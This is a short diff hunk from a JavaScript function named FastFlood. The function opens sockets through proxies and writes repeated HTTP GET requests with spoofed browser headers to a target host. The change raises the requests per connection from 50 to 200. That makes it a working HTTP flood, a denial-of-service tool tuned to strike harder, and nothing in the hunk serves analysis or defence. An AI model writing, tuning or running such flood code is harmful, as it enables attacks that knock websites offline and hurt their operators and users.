@@ -181,7 +181,7 @@ function FastFlood(targetString, targetHostString, methodString, proxyString, ua
     var Socket = require('net').Socket();
     Socket.connect(proxyString.split(":")[1], proxyString.split(":")[0]);
     //Socket.setTimeout(10000);
-    for (var i = 0; i < 50; i++) {
+    for (var i = 0; i < 200; i++) {
         Socket.write(`GET ${targetString} HTTP/1.1\r\nHost: ${targetHostString}\r\nReferer: ${refererString}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\nPragma: no-cache\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\nUser-Agent: ${uaString}\r\nConnection: Keep-Alive\r\n\r\n`);
     }
     Socket.on('data', function () { setTimeout(function () { Socket.destroy(); return delete Socket; }, 5000); })
